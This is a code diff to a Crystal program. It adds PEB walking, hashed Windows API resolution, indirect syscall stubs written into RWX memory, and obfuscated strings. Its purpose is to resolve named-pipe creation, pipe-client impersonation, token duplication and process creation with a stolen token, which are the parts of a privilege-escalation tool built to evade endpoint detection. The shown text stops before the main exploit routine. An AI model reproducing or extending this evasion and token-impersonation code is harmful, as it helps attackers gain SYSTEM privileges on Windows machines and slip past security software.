@@ -2,12 +2,18 @@ require "option_parser"
 
 # ─────────────── Config ─────────────────────────────────
 module Config
-  @@debug = false
-  def self.debug=(v : Bool); @@debug = v; end
-  def self.debug? : Bool; @@debug; end
+  @@debug_level = 0
+  def self.debug_level=(v : Int32); @@debug_level = v; end
+  def self.debug_level : Int32; @@debug_level; end
+  def self.debug? : Bool; @@debug_level >= 1; end
+  def self.verbose? : Bool; @@debug_level >= 2; end
 end
 
 def dbg(msg : String)
+  puts msg if Config.verbose?
+end
+
+def dbg1(msg : String)
   puts msg if Config.debug?
 end
 
@@ -22,52 +28,732 @@ macro obf(str)
   end
 end
 
-# ─────────────── Lib blocks ─────────────────────────────
-lib LibC
-  fun GetModuleHandleW(name : UInt16*) : Void*
-  fun GetCurrentProcess() : Void*
-  fun GetCurrentProcessId() : UInt32
-  fun GetCurrentThread() : Void*
-  fun VirtualProtect(addr : Void*, size : UInt64, new_protect : UInt32, old_protect : UInt32*) : Int32
-  fun OpenProcess(access : UInt32, inherit : Int32, pid : UInt32) : Void*
-  fun DuplicateHandle(source_proc : Void*, source_handle : Void*,
-    target_proc : Void*, target_handle : Void**, access : UInt32,
-    inherit : Int32, options : UInt32) : Int32
-  fun CreatePipe(read_pipe : Void**, write_pipe : Void**, security : Void*, size : UInt32) : Int32
-  fun SetHandleInformation(obj : Void*, mask : UInt32, flags : UInt32) : Int32
-  fun CreateNamedPipeW(name : UInt16*, open_mode : UInt32, pipe_mode : UInt32,
-    max_instances : UInt32, out_buf : UInt32, in_buf : UInt32,
-    timeout : UInt32, security : Void*) : Void*
-  fun ConnectNamedPipe(pipe : Void*, overlapped : Void*) : Int32
-  fun PeekNamedPipe(pipe : Void*, buffer : UInt8*, size : UInt32,
-    read : UInt32*, avail : UInt32*, left : UInt32*) : Int32
-  fun GlobalAlloc(flags : UInt32, bytes : UInt64) : Void*
-  fun GlobalLock(mem : Void*) : Void*
-  fun GlobalUnlock(mem : Void*) : Int32
-  fun GlobalSize(mem : Void*) : UInt64
-  fun Sleep(ms : UInt32) : Void
-  fun CreateThread(security : Void*, stack_size : UInt64,
-    start_address : Pointer(Void) -> UInt32, parameter : Void*,
-    creation_flags : UInt32, thread_id : UInt32*) : Void*
-  fun WaitForSingleObject(handle : Void*, ms : UInt32) : UInt32
-  fun ConvertStringSecurityDescriptorToSecurityDescriptorW(
-    sd : UInt16*, revision : UInt32, out_sd : Void**, out_size : UInt32*) : Int32
-  fun ImpersonateNamedPipeClient(pipe : Void*) : Int32
-  fun RevertToSelf() : Int32
-  fun OpenProcessToken(process : Void*, access : UInt32, token : Void**) : Int32
-  fun OpenThreadToken(thread : Void*, access : UInt32, open_as_self : Int32, token : Void**) : Int32
-  fun GetTokenInformation(token : Void*, info_class : Int32, info : Void*,
-    info_len : UInt32, return_len : UInt32*) : Int32
-  fun DuplicateTokenEx(existing : Void*, access : UInt32, sa : Void*,
-    imp_level : Int32, token_type : Int32, new_token : Void**) : Int32
-  fun CreateProcessWithTokenW(token : Void*, logon_flags : UInt32,
-    app : UInt16*, cmdline : UInt16*, creation : UInt32, env : Void*,
-    dir : UInt16*, si : Void*, pi : Void*) : Int32
-  fun CreateProcessAsUserW(token : Void*, app : UInt16*, cmdline : UInt16*,
-    proc_attr : Void*, thread_attr : Void*, inherit : Int32,
-    creation : UInt32, env : Void*, dir : UInt16*, si : Void*, pi : Void*) : Int32
-  fun GetSidSubAuthorityCount(sid : Void*) : UInt8*
-  fun GetSidSubAuthority(sid : Void*, sub_auth : UInt32) : UInt32*
+# ═════════════════════════════════════════════════════════
+#  PEB Walking / Dynamic API Resolution / Indirect Syscalls
+# ═════════════════════════════════════════════════════════
+
+module PEWalk
+  @@dbg_ssn_count = 0
+
+  def self.djb2_hash(buffer : Pointer(UInt8), length : Int32) : UInt32
+    h = 5381_u32
+    length.times do |i|
+      c = buffer[i]
+      next if c == 0
+      c = c &- 0x20 if c >= 0x61
+      h = ((h << 5) &+ h) &+ c.to_u32
+    end
+    h
+  end
+
+  def self.find_peb : UInt64
+    result = 0_u64
+    asm("movq %gs:0x60, $0" : "=r"(result))
+    result
+  end
+
+  def self.get_teb : UInt64
+    result = 0_u64
+    asm("movq %gs:0x30, $0" : "=r"(result))
+    result
+  end
+
+  def self.get_current_pid : UInt32
+    Pointer(UInt32).new(get_teb &+ 0x40).value
+  end
+
+  def self.ldr_module(module_hash : UInt32) : {UInt64, UInt32}
+    peb = find_peb
+    return {0_u64, 0_u32} if peb == 0
+
+    loader_data = Pointer(UInt64).new(peb &+ 0x18).value
+    return {0_u64, 0_u32} if loader_data == 0
+
+    first = Pointer(UInt64).new(loader_data &+ 0x10).value
+    return {0_u64, 0_u32} if first == 0
+    current = first
+
+    loop do
+      dll_base = Pointer(UInt64).new(current &+ 0x30).value
+      break if dll_base == 0
+
+      name_len = Pointer(UInt16).new(current &+ 0x58).value
+      name_buf = Pointer(UInt64).new(current &+ 0x60).value
+
+      if name_len > 0 && name_buf != 0
+        h = djb2_hash(Pointer(UInt8).new(name_buf), name_len.to_i32)
+        if h == module_hash
+          size = Pointer(UInt32).new(current &+ 0x40).value
+          return {dll_base, size}
+        end
+      end
+
+      current = Pointer(UInt64).new(current).value
+      break if current == first || current == 0
+    end
+
+    {0_u64, 0_u32}
+  end
+
+  def self.ldr_function(module_base : UInt64, function_hash : UInt32) : UInt64
+    return 0_u64 if module_base == 0
+
+    dos_sig = Pointer(UInt16).new(module_base).value
+    return 0_u64 if dos_sig != 0x5A4D
+
+    e_lfanew = Pointer(Int32).new(module_base &+ 0x3C).value
+    nt_headers = module_base &+ e_lfanew.to_u64
+
+    nt_sig = Pointer(UInt32).new(nt_headers).value
+    return 0_u64 if nt_sig != 0x4550
+
+    export_rva = Pointer(UInt32).new(nt_headers &+ 0x88).value
+    return 0_u64 if export_rva == 0
+
+    export_dir = module_base &+ export_rva.to_u64
+    num_names = Pointer(UInt32).new(export_dir &+ 0x18).value
+    addr_funcs_rva = Pointer(UInt32).new(export_dir &+ 0x1C).value
+    addr_names_rva = Pointer(UInt32).new(export_dir &+ 0x20).value
+    addr_ords_rva = Pointer(UInt32).new(export_dir &+ 0x24).value
+
+    names_ptr = module_base &+ addr_names_rva.to_u64
+    funcs_ptr = module_base &+ addr_funcs_rva.to_u64
+    ords_ptr = module_base &+ addr_ords_rva.to_u64
+
+    num_names.times do |i|
+      name_rva = Pointer(UInt32).new(names_ptr &+ i.to_u64 &* 4).value
+      name_addr = module_base &+ name_rva.to_u64
+
+      name_len = 0
+      while Pointer(UInt8).new(name_addr &+ name_len.to_u64).value != 0
+        name_len += 1
+        break if name_len > 256
+      end
+
+      h = djb2_hash(Pointer(UInt8).new(name_addr), name_len)
+      if h == function_hash
+        ordinal = Pointer(UInt16).new(ords_ptr &+ i.to_u64 &* 2).value
+        func_rva = Pointer(UInt32).new(funcs_ptr &+ ordinal.to_u64 &* 4).value
+        return module_base &+ func_rva.to_u64
+      end
+    end
+
+    0_u64
+  end
+
+  def self.get_ssn(target_hash : UInt32, ntdll_base : UInt64) : {Int32, UInt64}
+    return {-1, 0_u64} if ntdll_base == 0
+
+    e_lfanew = Pointer(Int32).new(ntdll_base &+ 0x3C).value
+    nt_headers = ntdll_base &+ e_lfanew.to_u64
+
+    export_rva = Pointer(UInt32).new(nt_headers &+ 0x88).value
+    return {-1, 0_u64} if export_rva == 0
+    export_dir = ntdll_base &+ export_rva.to_u64
+
+    num_names = Pointer(UInt32).new(export_dir &+ 0x18).value
+    funcs_rva = Pointer(UInt32).new(export_dir &+ 0x1C).value
+    names_rva = Pointer(UInt32).new(export_dir &+ 0x20).value
+    ords_rva = Pointer(UInt32).new(export_dir &+ 0x24).value
+
+    funcs_ptr = ntdll_base &+ funcs_rva.to_u64
+    names_ptr = ntdll_base &+ names_rva.to_u64
+    ords_ptr = ntdll_base &+ ords_rva.to_u64
+
+    exception_rva = Pointer(UInt32).new(nt_headers &+ 0xA0).value
+    return {-1, 0_u64} if exception_rva == 0
+    rtf = ntdll_base &+ exception_rva.to_u64
+
+    ssn = 0_i32
+    i = 0
+    @@dbg_ssn_count = (@@dbg_ssn_count || 0) + 1
+    first_call = (@@dbg_ssn_count == 1)
+
+    if first_call
+      dbg obf("[ssn] num_names:") + num_names.to_s
+      dbg obf("[ssn] export_rva:0x") + export_rva.to_s(16) + " exception_rva:0x" + exception_rva.to_s(16)
+      3.times do |k|
+        ba = Pointer(UInt32).new(rtf &+ k.to_u64 &* 12).value
+        dbg obf("[ssn] rtf[") + k.to_s + "].begin=0x" + ba.to_s(16)
+      end
+    end
+
+    loop do
+      begin_addr = Pointer(UInt32).new(rtf &+ i.to_u64 &* 12).value
+      break if begin_addr == 0
+
+      matched_export = false
+      num_names.times do |j|
+        ordinal = Pointer(UInt16).new(ords_ptr &+ j.to_u64 &* 2).value
+        func_rva = Pointer(UInt32).new(funcs_ptr &+ ordinal.to_u64 &* 4).value
+
+        if func_rva == begin_addr
+          matched_export = true
+          name_rva_val = Pointer(UInt32).new(names_ptr &+ j.to_u64 &* 4).value
+          name_addr = ntdll_base &+ name_rva_val.to_u64
+
+          name_len = 0
+          while Pointer(UInt8).new(name_addr &+ name_len.to_u64).value != 0
+            name_len += 1
+            break if name_len > 256
+          end
+
+          fname = String.new(Pointer(UInt8).new(name_addr), name_len)
+          h = djb2_hash(Pointer(UInt8).new(name_addr), name_len)
+
+          if first_call && i < 5
+            dbg obf("[ssn] i:") + i.to_s + " j:" + j.to_s + " rva:0x" + begin_addr.to_s(16) + " " + fname + " h:0x" + h.to_s(16)
+          end
+
+          if h == target_hash
+            dbg obf("[ssn] MATCH ") + fname + " h:0x" + h.to_s(16) + " ssn:" + ssn.to_s
+            return {ssn, ntdll_base &+ func_rva.to_u64}
+          end
+
+          if name_len >= 2
+            c0 = Pointer(UInt8).new(name_addr).value
+            c1 = Pointer(UInt8).new(name_addr &+ 1).value
+            if c0 == 0x5A && c1 == 0x77
+              ssn += 1
+            end
+          end
+        end
+      end
+
+      if first_call && !matched_export && i < 3
+        dbg obf("[ssn] i:") + i.to_s + " rva:0x" + begin_addr.to_s(16) + " NO EXPORT MATCH"
+      end
+
+      i += 1
+    end
+
+    {-1, 0_u64}
+  end
+end
+
+# ─────────────── Dynamic Call via Inline ASM ────────────
+module DynCall
+  STUB_SIZE = 21
+
+  def self.write_stub(base : UInt64, index : Int32, ssn : Int32, func_addr : UInt64) : UInt64
+    offset = base &+ (index &* STUB_SIZE).to_u64
+    target = func_addr &+ 0x12
+    ptr = Pointer(UInt8).new(offset)
+    ptr[0] = 0x49_u8; ptr[1] = 0x89_u8; ptr[2] = 0xCA_u8
+    ptr[3] = 0xB8_u8
+    ptr[4] = (ssn & 0xFF).to_u8
+    ptr[5] = ((ssn >> 8) & 0xFF).to_u8
+    ptr[6] = 0x00_u8; ptr[7] = 0x00_u8
+    ptr[8] = 0x49_u8; ptr[9] = 0xBB_u8
+    8.times { |i| ptr[10 + i] = ((target >> (i &* 8)) & 0xFF).to_u8 }
+    ptr[18] = 0x41_u8; ptr[19] = 0xFF_u8; ptr[20] = 0xE3_u8
+    offset
+  end
+
+  def self.bootstrap_virtual_alloc(va_addr : UInt64, size : UInt64) : UInt64
+    result = 0_u64
+    asm("
+      movq %rsp, %rbx
+      andq $$-16, %rsp
+      subq $$0x20, %rsp
+      xorl %ecx, %ecx
+      movl $$0x3000, %r8d
+      movl $$0x40, %r9d
+      callq *$2
+      movq %rbx, %rsp
+    " : "={rax}"(result) : "{rdx}"(size), "r"(va_addr) : "rbx", "rcx", "r8", "r9", "r10", "r11", "memory")
+    result
+  end
+
+  def self.call0(addr : UInt64) : UInt64
+    result = 0_u64
+    asm("
+      movq %rsp, %rbx
+      andq $$-16, %rsp
+      subq $$0x20, %rsp
+      callq *$1
+      movq %rbx, %rsp
+    " : "={rax}"(result) : "r"(addr) : "rbx", "rcx", "rdx", "r8", "r9", "r10", "r11", "memory")
+    result
+  end
+
+  def self.call1(addr : UInt64, a1 : UInt64) : UInt64
+    result = 0_u64
+    asm("
+      movq %rsp, %rbx
+      andq $$-16, %rsp
+      subq $$0x20, %rsp
+      callq *$2
+      movq %rbx, %rsp
+    " : "={rax}"(result) : "{rcx}"(a1), "r"(addr) : "rbx", "rdx", "r8", "r9", "r10", "r11", "memory")
+    result
+  end
+
+  def self.call2(addr : UInt64, a1 : UInt64, a2 : UInt64) : UInt64
+    result = 0_u64
+    asm("
+      movq %rsp, %rbx
+      andq $$-16, %rsp
+      subq $$0x20, %rsp
+      callq *$3
+      movq %rbx, %rsp
+    " : "={rax}"(result) : "{rcx}"(a1), "{rdx}"(a2), "r"(addr) : "rbx", "r8", "r9", "r10", "r11", "memory")
+    result
+  end
+
+  def self.call3(addr : UInt64, a1 : UInt64, a2 : UInt64, a3 : UInt64) : UInt64
+    result = 0_u64
+    asm("
+      movq %rsp, %rbx
+      andq $$-16, %rsp
+      subq $$0x20, %rsp
+      callq *$4
+      movq %rbx, %rsp
+    " : "={rax}"(result) : "{rcx}"(a1), "{rdx}"(a2), "{r8}"(a3), "r"(addr) : "rbx", "r9", "r10", "r11", "memory")
+    result
+  end
+
+  def self.call4(addr : UInt64, a1 : UInt64, a2 : UInt64, a3 : UInt64, a4 : UInt64) : UInt64
+    result = 0_u64
+    asm("
+      movq %rsp, %rbx
+      andq $$-16, %rsp
+      subq $$0x20, %rsp
+      callq *$5
+      movq %rbx, %rsp
+    " : "={rax}"(result) : "{rcx}"(a1), "{rdx}"(a2), "{r8}"(a3), "{r9}"(a4), "r"(addr) : "rbx", "r10", "r11", "memory")
+    result
+  end
+
+  def self.call5(addr : UInt64, a1 : UInt64, a2 : UInt64, a3 : UInt64, a4 : UInt64,
+                 a5 : UInt64) : UInt64
+    result = 0_u64
+    asm("
+      movq %rsp, %rbx
+      andq $$-16, %rsp
+      subq $$0x30, %rsp
+      movq $6, 0x20(%rsp)
+      callq *$5
+      movq %rbx, %rsp
+    " : "={rax}"(result) : "{rcx}"(a1), "{rdx}"(a2), "{r8}"(a3), "{r9}"(a4), "r"(addr), "r"(a5) : "rbx", "r10", "r11", "memory")
+    result
+  end
+
+  def self.call6(addr : UInt64, a1 : UInt64, a2 : UInt64, a3 : UInt64, a4 : UInt64,
+                 a5 : UInt64, a6 : UInt64) : UInt64
+    result = 0_u64
+    asm("
+      movq %rsp, %rbx
+      andq $$-16, %rsp
+      subq $$0x30, %rsp
+      movq $6, 0x20(%rsp)
+      movq $7, 0x28(%rsp)
+      callq *$5
+      movq %rbx, %rsp
+    " : "={rax}"(result) : "{rcx}"(a1), "{rdx}"(a2), "{r8}"(a3), "{r9}"(a4), "r"(addr), "r"(a5), "r"(a6) : "rbx", "r10", "r11", "memory")
+    result
+  end
+
+  def self.call7(addr : UInt64, a1 : UInt64, a2 : UInt64, a3 : UInt64, a4 : UInt64,
+                 a5 : UInt64, a6 : UInt64, a7 : UInt64) : UInt64
+    result = 0_u64
+    asm("
+      movq %rsp, %rbx
+      andq $$-16, %rsp
+      subq $$0x40, %rsp
+      movq $6, 0x20(%rsp)
+      movq $7, 0x28(%rsp)
+      movq $8, 0x30(%rsp)
+      callq *$5
+      movq %rbx, %rsp
+    " : "={rax}"(result) : "{rcx}"(a1), "{rdx}"(a2), "{r8}"(a3), "{r9}"(a4), "r"(addr), "r"(a5), "r"(a6), "r"(a7) : "rbx", "r10", "r11", "memory")
+    result
+  end
+
+  def self.call8(addr : UInt64, a1 : UInt64, a2 : UInt64, a3 : UInt64, a4 : UInt64,
+                 a5 : UInt64, a6 : UInt64, a7 : UInt64, a8 : UInt64) : UInt64
+    buf = uninitialized UInt64[4]
+    buf[0] = a5; buf[1] = a6; buf[2] = a7; buf[3] = a8
+    result = 0_u64
+    asm("
+      movq %rsp, %rbx
+      andq $$-16, %rsp
+      subq $$0x40, %rsp
+      movq 0x00($6), %rdi
+      movq %rdi, 0x20(%rsp)
+      movq 0x08($6), %rdi
+      movq %rdi, 0x28(%rsp)
+      movq 0x10($6), %rdi
+      movq %rdi, 0x30(%rsp)
+      movq 0x18($6), %rdi
+      movq %rdi, 0x38(%rsp)
+      callq *$5
+      movq %rbx, %rsp
+    " : "={rax}"(result) : "{rcx}"(a1), "{rdx}"(a2), "{r8}"(a3), "{r9}"(a4), "r"(addr),
+        "r"(buf.to_unsafe)
+      : "rbx", "rdi", "r10", "r11", "memory")
+    result
+  end
+
+  def self.call9(addr : UInt64, a1 : UInt64, a2 : UInt64, a3 : UInt64, a4 : UInt64,
+                 a5 : UInt64, a6 : UInt64, a7 : UInt64, a8 : UInt64, a9 : UInt64) : UInt64
+    buf = uninitialized UInt64[5]
+    buf[0] = a5; buf[1] = a6; buf[2] = a7; buf[3] = a8; buf[4] = a9
+    result = 0_u64
+    asm("
+      movq %rsp, %rbx
+      andq $$-16, %rsp
+      subq $$0x50, %rsp
+      movq 0x00($6), %rdi
+      movq %rdi, 0x20(%rsp)
+      movq 0x08($6), %rdi
+      movq %rdi, 0x28(%rsp)
+      movq 0x10($6), %rdi
+      movq %rdi, 0x30(%rsp)
+      movq 0x18($6), %rdi
+      movq %rdi, 0x38(%rsp)
+      movq 0x20($6), %rdi
+      movq %rdi, 0x40(%rsp)
+      callq *$5
+      movq %rbx, %rsp
+    " : "={rax}"(result) : "{rcx}"(a1), "{rdx}"(a2), "{r8}"(a3), "{r9}"(a4), "r"(addr),
+        "r"(buf.to_unsafe)
+      : "rbx", "rdi", "r10", "r11", "memory")
+    result
+  end
+
+  def self.call11(addr : UInt64, a1 : UInt64, a2 : UInt64, a3 : UInt64, a4 : UInt64,
+                  a5 : UInt64, a6 : UInt64, a7 : UInt64, a8 : UInt64,
+                  a9 : UInt64, a10 : UInt64, a11 : UInt64) : UInt64
+    buf = uninitialized UInt64[7]
+    buf[0] = a5; buf[1] = a6; buf[2] = a7; buf[3] = a8
+    buf[4] = a9; buf[5] = a10; buf[6] = a11
+    result = 0_u64
+    asm("
+      movq %rsp, %rbx
+      andq $$-16, %rsp
+      subq $$0x60, %rsp
+      movq 0x00($6), %rdi
+      movq %rdi, 0x20(%rsp)
+      movq 0x08($6), %rdi
+      movq %rdi, 0x28(%rsp)
+      movq 0x10($6), %rdi
+      movq %rdi, 0x30(%rsp)
+      movq 0x18($6), %rdi
+      movq %rdi, 0x38(%rsp)
+      movq 0x20($6), %rdi
+      movq %rdi, 0x40(%rsp)
+      movq 0x28($6), %rdi
+      movq %rdi, 0x48(%rsp)
+      movq 0x30($6), %rdi
+      movq %rdi, 0x50(%rsp)
+      callq *$5
+      movq %rbx, %rsp
+    " : "={rax}"(result) : "{rcx}"(a1), "{rdx}"(a2), "{r8}"(a3), "{r9}"(a4), "r"(addr),
+        "r"(buf.to_unsafe)
+      : "rbx", "rdi", "r10", "r11", "memory")
+    result
+  end
+end
+
+# ─────────────── Syscall & DynApi State ─────────────────
+module SysState
+  # Syscall stubs (SSN + address resolved from ntdll exception directory)
+  @@nt_close = 0_u64
+  @@nt_query_sys_info = 0_u64
+  @@nt_open_process = 0_u64
+  @@nt_open_process_token = 0_u64
+  @@nt_open_thread_token = 0_u64
+  @@nt_duplicate_token = 0_u64
+  @@nt_query_info_token = 0_u64
+  @@nt_duplicate_object = 0_u64
+  @@nt_wait_single = 0_u64
+  @@nt_protect_vm = 0_u64
+
+  # Dynamic function addresses (kernel32 / advapi32)
+  @@create_named_pipe_w = 0_u64
+  @@connect_named_pipe = 0_u64
+  @@peek_named_pipe = 0_u64
+  @@create_proc_token_w = 0_u64
+  @@create_proc_user_w = 0_u64
+  @@impersonate_pipe = 0_u64
+  @@revert_to_self = 0_u64
+  @@convert_sd = 0_u64
+  @@open_thread_token_k32 = 0_u64
+
+  @@initialized = false
+
+  SYSCALL_HASHES = {
+    nt_close:              0x40d6e69d_u32,
+    nt_query_sys_info:     0x7bc23928_u32,
+    nt_open_process:       0x4b82f718_u32,
+    nt_open_process_token: 0x350dca99_u32,
+    nt_open_thread_token:  0x803347d2_u32,
+    nt_duplicate_token:    0x8e160b23_u32,
+    nt_query_info_token:   0x0f371fe4_u32,
+    nt_duplicate_object:   0x4441d859_u32,
+    nt_wait_single:        0xe8ac0c3c_u32,
+    nt_protect_vm:         0x50e92888_u32,
+  }
+
+  private def self.resolve_one(name : String, hash : UInt32, ntdll_base : UInt64,
+                                rwx_base : UInt64, idx : Int32) : UInt64
+    ssn, addr = PEWalk.get_ssn(hash, ntdll_base)
+    if ssn >= 0
+      stub = DynCall.write_stub(rwx_base, idx, ssn, addr)
+      dbg obf("[+] ") + name + " ssn:" + ssn.to_s + " @0x" + stub.to_s(16)
+      stub
+    else
+      dbg obf("[-] ") + name + " NOT FOUND"
+      0_u64
+    end
+  end
+
+  def self.init
+    return if @@initialized
+
+    dbg obf("[*] SysState.init start")
+
+    ntdll_base, _ = PEWalk.ldr_module(0x1edab0ed_u32)
+    dbg obf("[*] ntdll:0x") + ntdll_base.to_s(16)
+    raise obf("ntdll not found") if ntdll_base == 0
+
+    k32_base, _ = PEWalk.ldr_module(0x6ddb9555_u32)
+    dbg obf("[*] k32:0x") + k32_base.to_s(16)
+    raise obf("kernel32 not found") if k32_base == 0
+
+    va_addr = PEWalk.ldr_function(k32_base, 0x097bc257_u32)
+    dbg obf("[*] VA:0x") + va_addr.to_s(16)
+    raise obf("VirtualAlloc not found") if va_addr == 0
+
+    stub_count = 10
+    rwx_size = (stub_count * DynCall::STUB_SIZE + 0xFFF) & ~0xFFF
+    rwx_base = DynCall.bootstrap_virtual_alloc(va_addr, rwx_size.to_u64)
+    dbg obf("[*] rwx:0x") + rwx_base.to_s(16)
+    raise obf("VirtualAlloc failed") if rwx_base == 0
+
+    @@nt_close            = resolve_one(obf("NC"),  0x40d6e69d_u32, ntdll_base, rwx_base, 0)
+    @@nt_query_sys_info   = resolve_one(obf("QSI"), 0x7bc23928_u32, ntdll_base, rwx_base, 1)
+    @@nt_open_process     = resolve_one(obf("OP"),  0x4b82f718_u32, ntdll_base, rwx_base, 2)
+    @@nt_open_process_token = resolve_one(obf("OPT"), 0x350dca99_u32, ntdll_base, rwx_base, 3)
+    @@nt_open_thread_token = resolve_one(obf("OTT"), 0x803347d2_u32, ntdll_base, rwx_base, 4)
+    @@nt_duplicate_token  = resolve_one(obf("DT"),  0x8e160b23_u32, ntdll_base, rwx_base, 5)
+    @@nt_query_info_token = resolve_one(obf("QIT"), 0x0f371fe4_u32, ntdll_base, rwx_base, 6)
+    @@nt_duplicate_object = resolve_one(obf("DO"),  0x4441d859_u32, ntdll_base, rwx_base, 7)
+    @@nt_wait_single      = resolve_one(obf("WS"),  0xe8ac0c3c_u32, ntdll_base, rwx_base, 8)
+    @@nt_protect_vm       = resolve_one(obf("PVM"), 0x50e92888_u32, ntdll_base, rwx_base, 9)
+
+    resolve_k32(k32_base)
+    resolve_advapi32
+
+    dbg obf("[*] SysState.init done")
+    @@initialized = true
+  end
+
+  private def self.resolve_k32(k32_base : UInt64)
+    @@create_named_pipe_w = PEWalk.ldr_function(k32_base, 0xa05e2a83_u32)
+    @@connect_named_pipe = PEWalk.ldr_function(k32_base, 0x436e4c62_u32)
+    @@peek_named_pipe = PEWalk.ldr_function(k32_base, 0xd5312e5d_u32)
+    @@open_thread_token_k32 = PEWalk.ldr_function(k32_base, 0xe249d070_u32)
+    dbg obf("[k32] cnpw=0x") + @@create_named_pipe_w.to_s(16) + " cnp=0x" + @@connect_named_pipe.to_s(16) + " pnp=0x" + @@peek_named_pipe.to_s(16)
+  end
+
+  private def self.resolve_advapi32
+    adv_base, _ = PEWalk.ldr_module(0x64bb3129_u32)
+    if adv_base == 0
+      dbg obf("[adv32] NOT FOUND in PEB")
+      return
+    end
+    dbg obf("[adv32] base=0x") + adv_base.to_s(16)
+
+    @@create_proc_token_w = PEWalk.ldr_function(adv_base, 0xf3e5480c_u32)
+    @@create_proc_user_w = PEWalk.ldr_function(adv_base, 0xedbe7a62_u32)
+    @@impersonate_pipe = PEWalk.ldr_function(adv_base, 0xefdd3d9e_u32)
+    @@revert_to_self = PEWalk.ldr_function(adv_base, 0x7292758a_u32)
+    @@convert_sd = PEWalk.ldr_function(adv_base, 0xd93ad585_u32)
+    dbg obf("[adv32] convert_sd=0x") + @@convert_sd.to_s(16) + " impersonate=0x" + @@impersonate_pipe.to_s(16)
+
+    if @@open_thread_token_k32 == 0
+      @@open_thread_token_k32 = PEWalk.ldr_function(adv_base, 0xe249d070_u32)
+    end
+  end
+
+  # ─── Syscall wrappers ───
+
+  def self.nt_close(handle : Pointer(Void)) : Int32
+    DynCall.call1(@@nt_close, handle.address.to_u64).to_i32!
+  end
+
+  def self.nt_query_system_information(info_class : UInt32, buf : Pointer(Void),
+                                       buf_len : UInt32, ret_len : Pointer(UInt32)) : UInt32
+    DynCall.call4(@@nt_query_sys_info,
+      info_class.to_u64, buf.address.to_u64,
+      buf_len.to_u64, ret_len.address.to_u64).to_u32!
+  end
+
+  def self.nt_open_process(handle_out : Pointer(Pointer(Void)), access : UInt32,
+                           oa : Pointer(Void), cid : Pointer(Void)) : Int32
+    DynCall.call4(@@nt_open_process,
+      handle_out.address.to_u64, access.to_u64,
+      oa.address.to_u64, cid.address.to_u64).to_i32!
+  end
+
+  def self.nt_open_process_token(process : Pointer(Void), access : UInt32,
+                                  token_out : Pointer(Pointer(Void))) : Int32
+    DynCall.call3(@@nt_open_process_token,
+      process.address.to_u64, access.to_u64,
+      token_out.address.to_u64).to_i32!
+  end
+
+  def self.nt_open_thread_token(thread : Pointer(Void), access : UInt32,
+                                 open_as_self : Int32, token_out : Pointer(Pointer(Void))) : Int32
+    DynCall.call4(@@nt_open_thread_token,
+      thread.address.to_u64, access.to_u64,
+      open_as_self.to_u64, token_out.address.to_u64).to_i32!
+  end
+
+  def self.nt_query_information_token(token : Pointer(Void), info_class : UInt32,
+                                       buf : Pointer(Void), buf_len : UInt32,
+                                       ret_len : Pointer(UInt32)) : Int32
+    DynCall.call5(@@nt_query_info_token,
+      token.address.to_u64, info_class.to_u64,
+      buf.address.to_u64, buf_len.to_u64,
+      ret_len.address.to_u64).to_i32!
+  end
+
+  def self.nt_duplicate_token(existing : Pointer(Void), access : UInt32,
+                               oa : Pointer(Void), imp_level : UInt32,
+                               token_type : UInt32, new_token : Pointer(Pointer(Void))) : Int32
+    DynCall.call6(@@nt_duplicate_token,
+      existing.address.to_u64, access.to_u64,
+      oa.address.to_u64, imp_level.to_u64,
+      token_type.to_u64, new_token.address.to_u64).to_i32!
+  end
+
+  def self.nt_duplicate_object(src_proc : Pointer(Void), src_handle : Pointer(Void),
+                                tgt_proc : Pointer(Void), tgt_handle : Pointer(Pointer(Void)),
+                                access : UInt32, attrs : UInt32, options : UInt32) : Int32
+    DynCall.call7(@@nt_duplicate_object,
+      src_proc.address.to_u64, src_handle.address.to_u64,
+      tgt_proc.address.to_u64, tgt_handle.address.to_u64,
+      access.to_u64, attrs.to_u64, options.to_u64).to_i32!
+  end
+
+  def self.nt_wait_for_single_object(handle : Pointer(Void), alertable : Int32,
+                                      timeout : Pointer(Void)) : Int32
+    DynCall.call3(@@nt_wait_single,
+      handle.address.to_u64, alertable.to_u64,
+      timeout.address.to_u64).to_i32!
+  end
+
+  def self.nt_protect_virtual_memory(process : Pointer(Void), base_addr : Pointer(Pointer(Void)),
+                                      region_size : Pointer(UInt64), new_prot : UInt32,
+                                      old_prot : Pointer(UInt32)) : Int32
+    DynCall.call5(@@nt_protect_vm,
+      process.address.to_u64, base_addr.address.to_u64,
+      region_size.address.to_u64, new_prot.to_u64,
+      old_prot.address.to_u64).to_i32!
+  end
+
+  # ─── Dynamic API wrappers ───
+
+  def self.create_named_pipe_w(name : Pointer(UInt16), open_mode : UInt32, pipe_mode : UInt32,
+                                max_inst : UInt32, out_buf : UInt32, in_buf : UInt32,
+                                timeout : UInt32, security : Pointer(Void)) : Pointer(Void)
+    r = DynCall.call8(@@create_named_pipe_w,
+      name.address.to_u64, open_mode.to_u64, pipe_mode.to_u64, max_inst.to_u64,
+      out_buf.to_u64, in_buf.to_u64, timeout.to_u64, security.address.to_u64)
+    Pointer(Void).new(r)
+  end
+
+  def self.connect_named_pipe(pipe : Pointer(Void), overlapped : Pointer(Void)) : Int32
+    DynCall.call2(@@connect_named_pipe,
+      pipe.address.to_u64, overlapped.address.to_u64).to_i32!
+  end
+
+  def self.peek_named_pipe(pipe : Pointer(Void), buffer : Pointer(UInt8), size : UInt32,
+                            read : Pointer(UInt32), avail : Pointer(UInt32),
+                            left : Pointer(UInt32)) : Int32
+    DynCall.call6(@@peek_named_pipe,
+      pipe.address.to_u64, buffer.address.to_u64, size.to_u64,
+      read.address.to_u64, avail.address.to_u64, left.address.to_u64).to_i32!
+  end
+
+  def self.impersonate_named_pipe_client(pipe : Pointer(Void)) : Int32
+    DynCall.call1(@@impersonate_pipe, pipe.address.to_u64).to_i32!
+  end
+
+  def self.revert_to_self : Int32
+    DynCall.call0(@@revert_to_self).to_i32!
+  end
+
+  def self.dbg_convert_sd : UInt64
+    @@convert_sd
+  end
+
+  def self.dbg_create_named_pipe_w : UInt64
+    @@create_named_pipe_w
+  end
+
+  def self.convert_sd_w(sd_str : Pointer(UInt16), revision : UInt32,
+                         out_sd : Pointer(Pointer(Void)), out_size : Pointer(UInt32)) : Int32
+    DynCall.call4(@@convert_sd,
+      sd_str.address.to_u64, revision.to_u64,
+      out_sd.address.to_u64, out_size.address.to_u64).to_i32!
+  end
+
+  def self.open_thread_token(thread : Pointer(Void), access : UInt32,
+                              open_as_self : Int32, token_out : Pointer(Pointer(Void))) : Int32
+    DynCall.call4(@@open_thread_token_k32,
+      thread.address.to_u64, access.to_u64,
+      open_as_self.to_u64, token_out.address.to_u64).to_i32!
+  end
+
